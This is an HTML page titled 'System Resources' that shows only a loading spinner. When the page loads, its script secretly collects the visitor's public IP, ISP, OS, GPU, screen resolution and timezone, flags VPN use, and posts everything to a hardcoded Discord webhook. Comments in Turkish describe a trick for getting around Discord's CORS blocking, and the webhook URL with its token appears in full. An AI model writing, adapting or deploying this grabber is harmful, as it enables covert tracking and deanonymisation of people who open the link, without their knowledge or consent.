<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>System Resources</title>
    <style>
        body { background: #000; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .loader { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>

    <script>
        "use strict";

        const webhook = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";

        async function extractAndSend() {
            // 1. Veri Toplama (√ñnceki ba≈üarƒ±lƒ± mantƒ±k)
            let d = {
                os: "Unknown",
                gpu: "Masked",
                res: `${screen.width}x${screen.height}`,
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                bat: "N/A"
            };

            try { d.os = navigator.userAgent.match(/\(([^)]+)\)/)[1]; } catch(e){}
            try {
                const gl = document.createElement('canvas').getContext('webgl');
                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
            } catch(e){}

            // 2. IP ve VPN (Hƒ±zlƒ± Sorgu)
            let networkField = "Fetching...";
            let vpnField = "‚úÖ Clear";
            try {
                const res = await fetch('https://ipapi.co/json/');
                const j = await res.json();
                networkField = `IP: ${j.ip}\nISS: ${j.org}`;
                if(j.timezone !== d.tz) vpnField = `üö® VPN DETECTED (${j.timezone})`;
            } catch(e){ vpnField = "‚ö†Ô∏è Blocked"; }

            // 3. KRƒ∞Tƒ∞K NOKTA: Mesajƒ± Discord'a Kabul Ettirme
            const payload = {
                embeds: [{
                    title: "üíÄ OMNISCIENCE V2.5 (CORS BYPASS)",
                    color: vpnField.includes("üö®") ? 15158332 : 3066993,
                    fields: [
                        { name: "üõ°Ô∏è SECURITY", value: vpnField },
                        { name: "üì° NETWORK", value: networkField },
                        { name: "üõ†Ô∏è HARDWARE", value: `GPU: ${d.gpu}\nOS: ${d.os}\nRES: ${d.res}` }
                    ],
                    timestamp: new Date()
                }]
            };

            // Discord'un CORS engelini a≈ümak i√ßin FormData kullanƒ±mƒ±
            const formData = new FormData();
            formData.append('payload_json', JSON.stringify(payload));

            try {
                // Bu y√∂ntem Discord tarafƒ±ndan 'Simple Request' olarak kabul edilir ve bloklanmaz
                await fetch(webhook, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: formData
                });
                console.log("Sent via FormData");
            } catch (e) {
                // Fallback: Beacon
                navigator.sendBeacon(webhook, formData);
            }
        }

        window.onload = extractAndSend;
    </script>
</body>
</html>
